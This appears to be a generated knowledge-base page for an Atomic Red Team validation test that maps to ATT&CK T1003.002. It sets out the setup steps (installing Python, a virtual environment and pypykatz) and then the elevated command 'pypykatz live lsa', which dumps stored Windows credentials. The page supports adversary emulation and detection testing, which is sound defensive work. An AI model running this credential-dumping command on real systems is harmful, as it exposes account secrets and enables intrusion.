---
atomic_guid: "a96872b2-cbf3-46cf-8eb4-27e8c0e85263"
title: "Registry parse with pypykatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.002"
attack_technique_name: "OS Credential Dumping: Security Account Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "a96872b2-cbf3-46cf-8eb4-27e8c0e85263"
  - "Registry parse with pypykatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Registry parse with pypykatz

Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.

## Metadata

- Atomic GUID: a96872b2-cbf3-46cf-8eb4-27e8c0e85263
- Technique: T1003.002: OS Credential Dumping: Security Account Manager
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1003.002/T1003.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.002]]

## Input Arguments

### venv_path

- description: Path to the folder for the tactics venv
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_002

## Dependencies

Computer must have python 3 installed

### Prerequisite Check

```text
if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
```

Computer must have venv configured at #{venv_path}

### Prerequisite Check

```text
if (Test-Path -Path "#{venv_path}") { exit 0 } else { exit 1 }
```

### Get Prerequisite

```text
py -m venv "#{venv_path}"
```

pypykatz must be installed

### Prerequisite Check

```text
if (Get-Command "#{venv_path}\Scripts\pypykatz" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```text
& "#{venv_path}\Scripts\pip.exe" install --no-cache-dir pypykatz 2>&1 | Out-Null
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
"#{venv_path}\Scripts\pypykatz" live lsa
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml)
